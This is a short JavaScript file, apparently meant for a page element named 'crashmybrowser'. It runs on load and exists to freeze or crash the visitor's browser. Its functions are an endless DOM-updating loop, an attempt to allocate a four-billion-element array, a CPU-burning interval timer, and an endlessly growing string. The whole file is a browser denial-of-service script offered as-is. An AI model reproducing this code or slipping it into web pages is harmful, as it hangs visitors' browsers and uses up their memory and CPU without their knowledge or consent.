start();
function start() {
    breakPageOnly();
    MemoryOveruse();
    CPUGrinder();
    infiniteString();
}

function breakPageOnly() {
    var doc = document.getElementById("crashmybrowser");
    var i = 0;
    var adder = document.createElement("p");
    doc.appendChild(adder);
    while (true) {
        i++;
        adder.textContent = i;
    }
}

function MemoryOveruse() {
    [...Array(2 ** 32 - 1)];
}

function CPUGrinder() {
    var doc = document.getElementById("crashmybrowser");
    var i = 0;
    var adder = document.createElement("p");
    doc.appendChild(adder);
    setInterval(() => {
        i = Math.round(i*2/4-1+2*i);
        console.log(i);
        adder.textContent = i;
    }, 50);
}

function infiniteString() {
    var txt = "a";
    while (1) {
        txt = txt += "a";
    }
}